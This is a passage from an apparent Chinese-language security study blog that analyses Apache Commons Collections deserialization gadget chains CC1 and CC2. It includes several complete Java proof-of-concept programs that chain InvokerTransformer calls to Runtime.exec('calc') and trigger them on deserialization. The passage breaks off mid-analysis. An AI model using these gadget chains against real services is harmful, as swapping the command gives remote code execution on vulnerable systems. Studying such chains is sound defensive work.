<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        x.writeObject(o);</span><br><span class="line">        x.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        ctf.readObject();</span><br><span class="line">        ctf.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机：</p>
<p><img src="/2024/08/13/CC1/image-20240727012113328.png" alt="image-20240727012113328"></p>
<p>——————</p>
<h6 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h6><p>OK，现在就是解决前面遗留的问题。</p>
<p><strong>1.设置一个方法名称对应的键的实践</strong>，也就是加一个<code>hashMap.put(&quot;entrySet&quot;,&quot;xxxx&quot;);</code>  。最后的测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;entrySet&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);<span class="comment">//here!!!!</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,proxyMap);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        x.writeObject(o);</span><br><span class="line">        x.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        ctf.readObject();</span><br><span class="line">        ctf.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终并没有弹出计算机，想法正确。</p>
<p>2,.<strong>创建代理对象时的方法参数问题</strong>，在我们想要利用的LazyMap链中，其实只要到了<code>AnnotationInvocationHandler#invoke</code>中，正确调用了get方法，那么对于后续的如正常代理中的会去到委托类一下都是无意义的，而且这里本身LazyMap就实现了Map接口，所以在创建代理对象的时候，可以像前面的POC那样构造，但其实使用LazyMap也是可以的，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor1.newInstance(Retention.class,outerMap);</span><br><span class="line">        Class[] interfaces = LazyMap.class.getInterfaces();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Retention.class,proxyMap);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        x.writeObject(o);</span><br><span class="line">        x.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        ctf.readObject();</span><br><span class="line">        ctf.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也成功弹出计算机：</p>
<p><img src="/2024/08/13/CC1/image-20240727012024028.png" alt="image-20240727012024028"></p>
<h5 id="CC1的局限"><a href="#CC1的局限" class="headerlink" title="CC1的局限"></a>CC1的局限</h5><p>在Java 8u71以后，官方修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject方法。</p>
<p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC1</category>
      </categories>
  </entry>
  <entry>
    <title>CC2</title>
    <url>/2024/08/13/CC2/</url>
    <content><![CDATA[<p>Java学习</p>
<span id="more"></span>

<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="common-collection4"><a href="#common-collection4" class="headerlink" title="common-collection4"></a>common-collection4</h2><p>官方认为旧的旧的common-collection有一些结构和API设计上的问题，但修复这些问题会产生大量不能向前兼容的改动。于是推出的common-collection4不再认为是一个用来替换common-collection的新版本，而是一个新的包。</p>
<p>两者的命名空间不冲突，可以共存在同一个项目中。</p>
<p><strong>在common-collection4-4.0下，依旧能利用common-collection-3.2.1的调用链</strong>，只是换了个包名而已。</p>
<p>依赖改成如下即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p><strong>简单说点区别</strong>吧，比如</p>
<ul>
<li>LazyMap的decorate：</li>
</ul>
<p>3.2.1<img src="/2024/08/13/CC2/image-20240731110155651.png" alt="image-20240731110155651"></p>
<p>4.0</p>
<p><img src="/2024/08/13/CC2/image-20240731110801082.png" alt="image-20240731110801082"></p>
<p><strong>总结</strong>：一定要注意包的问题，还是有不一样的</p>
<p><u>针对common-collections4，ysoserial也是给出了两条反序列化调用链，也就是cc2和cc4，这里就讲讲CC2。</u></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><ul>
<li>commons-collections4.0</li>
<li>JDK 8u411</li>
</ul>
<p>CC2有利用到<code>javassist</code>，所以这里需要有<code>javassist</code>的前置知识。</p>
<h3 id="需要了解的类"><a href="#需要了解的类" class="headerlink" title="需要了解的类"></a>需要了解的类</h3><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p><strong>这个类位于</strong><code>java.util.PriorityQueue</code></p>
<p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
<p>因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会更具元素的排序顺序决定出堆的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。</p>
<p>在CC2中，我们就是要利用到PriorityQueue类，来看这个类重写的readObject()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里将数据反序列化到<code>queue</code>中后，会调用<code>heapify()</code>方法来对数据进行排序。跟进一下<code>heapify()</code>方法：<br><img src="/2024/08/13/CC2/image-20240802205957639.png" alt="image-20240802205957639"></p>
<p><code>heapify()</code>方法会调用<code>siftDown()</code>，继续跟进：</p>
<p><img src="/2024/08/13/CC2/image-20240802210116518.png" alt="image-20240802210116518"></p>
<p>当<code>comparator</code>不为 null 的时候，就会调用<code>siftDownUsingComparator()</code>方法：</p>
<p><img src="/2024/08/13/CC2/image-20240802210453983.png" alt="image-20240802210453983"></p>
<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。</p>
<p>这样，反序列化之后的优先级队列，也拥有了顺序。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>TransformingComparator 是触发漏洞的关键，他将 Transformer 执行点和 PriorityQueue 触发点联系了起来。<strong>这个类位于</strong><code>org.apache.commons.collections4.comparators.TransformingComparator</code>。</p>
<p>既然这里都说到了联系了起来，在PriorityQueue 类的最后说到了 compare() 方法，那么我们来看一下TransformingComparator 的compare()方法：<br><img src="/2024/08/13/CC2/image-20240802211302460.png" alt="image-20240802211302460"></p>
<p>这里就调用到了transform 方法，通过的是<code>this.transformer</code>对象，来看一下TransformingComparator的构造方法：<br><img src="/2024/08/13/CC2/image-20240802211515343.png" alt="image-20240802211515343"></p>
<p>如果初始化的时候不指定 Comparator，则使用这个类直接定义的的 <code>ComparableComparator.comparableComparator()</code>，也就是第一个构造方法，并且我们就是要利用第一个构造方法。</p>
<p>这里可以看到正好这个<code>this.transformer</code>变量是我们要求的Transformer类型。这样我们就传入基本盘的链子实现漏洞利用。</p>
<p>链子大概出来了，现在就是来构造。</p>
<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p>还是给个代码来调试，结合前面的大概链子的说明，这里需要给出PriorityQueue实例和TransformingComparator实例，还是简单给出一个代码来调试。来看一下我们要利用到的PriorityQueue类的构造方法：<br><img src="/2024/08/13/CC2/image-20240802221841596.png" alt="image-20240802221841596"></p>
<p>这里的initialCapacity不能小于1。</p>
<p>结合前面的描述，我们需要将这里的<code>this.comparator</code>设置为TransformingComparator类的实例。</p>
<p><strong>那么就可以尝试构造一下代码了：</strong></p>
<p>fake:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>,comparator1);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在调试过程中，直接在heapify()就结束了，并没有进入for循环：<br><img src="/2024/08/13/CC2/image-20240803002101939.png" alt="image-20240803002101939"></p>
<p>（gpt的回答）这是因为<code>PriorityQueue</code>被初始化的时候只有一个元素空间，但是没有实际添加任何元素，所以我们需要调用<code>PriorityQueue</code>的add方法来向对象添加元素</p>
<h3 id="疑问一"><a href="#疑问一" class="headerlink" title="疑问一"></a>疑问一</h3><p>这里就有个小疑问了，初始化了一个元素空间，这是什么，我们看之前给出的利用到的<code>PriorityQueue</code>类的构造方法：<br><img src="/2024/08/13/CC2/image-20240803003120535.png" alt="image-20240803003120535"></p>
<p>并且我们在初始化的时候确实是只传了一个1进去。现在来<strong>分析一下这个构造方法</strong>，我们看这一块：<br><img src="/2024/08/13/CC2/image-20240803003217885.png" alt="image-20240803003217885"></p>
<p>这里是创建了一个下标为<code>initialCapacity</code>的Object数组并赋值给了<code>this.queue</code>，所以在这里<code>initialCapacity</code>的值代表了这个数组能容纳多少个值。</p>
<p><strong>那么现在来看一下add方法：</strong><br><img src="/2024/08/13/CC2/image-20240803003547015.png" alt="image-20240803003547015"></p>
<p>这个add方法实际调用的是<code>offer()</code>方法，<strong>来分析一下offer()方法的源码：</strong></p>
<p>这里用到了size变量，定义如下：<br><img src="/2024/08/13/CC2/image-20240803005043238.png" alt="image-20240803005043238"></p>
<p>继续分析offer()方法：</p>
<ul>
<li><p>当第一次调用add，即第一次进入offer方法，此时会将<code>i</code>设置为size定义的0，然后<strong>由于i&lt;我们初始化定义的queue数组长度1</strong>，所以不会进入第一个if条件</p>
</li>
<li><p>然后继续，此时就会size赋值<code>i+1</code>，导致size的值变成1。</p>
</li>
<li><p>然后由于第一次进入，此时的i为0，就会进入第二个if条件，这样就会将我们定义得queue数组的第一个值定义为我们add进的比如10。</p>
</li>
<li><p>这样就完成了数组的赋值。</p>
</li>
</ul>
<p>那么如果我们类初始化时传入的是2呢？定义了“两个容量”的数组，然后<strong>在第二次put时会发生什么？</strong>（假设我们第二次还是add进10）</p>
<ul>
<li><p>这样i就是1，第一个if条件同样不会进入</p>
</li>
<li><p>size的值变成2</p>
</li>
<li><p>第二个if条件不会进入，<strong>会调用siftUp方法</strong>，那么此时的i为1，x为10，看一下源码：</p>
<p><img src="/2024/08/13/CC2/image-20240803005932255.png" alt="image-20240803005932255"></p>
<p>类初始化的时候我们定义了comparator变量，继续跟进siftUpUsingComparator方法：</p>
<p><img src="/2024/08/13/CC2/image-20240803010624340.png" alt="image-20240803010624340"></p>
<p>这里自然会进入while循环，并且会调用comparator的compare()方法来比较（稍微看一下可以知道就是在给数组第二个赋值，所以基本可以肯定我们初始化时传进去的int值就是用来确定可以add进几个元素了）。</p>
<p>————</p>
<p>这里我想到了一个东西，由于我们传入的compare变量为TransformingComparator，那么是否可以认为只要我们正确传入链子，这里应该是可以成功弹出计算机的，测试一下：</p>
